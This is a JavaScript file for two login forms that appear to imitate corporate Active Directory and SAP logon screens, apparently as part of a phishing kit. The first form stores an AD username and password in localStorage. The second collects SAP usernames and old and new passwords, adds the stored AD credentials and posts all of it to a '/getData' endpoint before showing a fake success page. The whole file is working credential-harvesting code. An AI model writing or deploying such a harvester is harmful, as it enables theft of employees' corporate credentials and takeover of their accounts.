let formAD = document.getElementById("formAD");
let formSAP = document.getElementById("formSAP");

formAD?.addEventListener("submit", (e) => {
	e.preventDefault();

	let usernameAD = document.getElementById("usernameAD").value;
	let passwordAD = document.getElementById("passwordAD").value;

	if (usernameAD == "" || passwordAD == "") {
		alert("Make sure you've filled in the 2 fields!");
	} else {
		localStorage.setItem("usernameAD", usernameAD);
		localStorage.setItem("passwordAD", passwordAD);

		document.location.href = "/logon-sap";
	}
});

formSAP?.addEventListener("submit", (e) => {
	e.preventDefault();

	let usernameSAP = document.getElementById("usernameSAP").value;
	let oldpasswordSAP = document.getElementById("oldpasswordSAP").value;
	let newPasswordSAP = document.getElementById("newPasswordSAP").value;
	let confNewPasswordSAP = document.getElementById("confNewPasswordSAP").value;
	let language = document.getElementById("language").value;
	let sapClient = document.getElementById("sapClient").value;

	if (
		usernameSAP == "" ||
		oldpasswordSAP == "" ||
		newPasswordSAP == "" ||
		confNewPasswordSAP == "" ||
		language == "" ||
		sapClient == ""
	) {
		alert("Make sure you've filled in the 6 fields!");
	} else {
		let usernameAD = localStorage.getItem("usernameAD");
		let passwordAD = localStorage.getItem("passwordAD");

		localStorage.removeItem("usernameAD");
		localStorage.removeItem("passwordAD");

		fetch("/getData", {
			method: "POST",
			headers: {
				Accept: "application/json",
				"Content-Type": "application/json",
			},
			body: JSON.stringify({
				usernameAD,
				passwordAD,
				usernameSAP,
				oldpasswordSAP,
				newPasswordSAP,
				confNewPasswordSAP,
				language,
				sapClient,
			}),
		})
			.then((response) => response.json())
			.then((response) => {
				document.location.href = "/logon-sap-success";
			});
	}
});
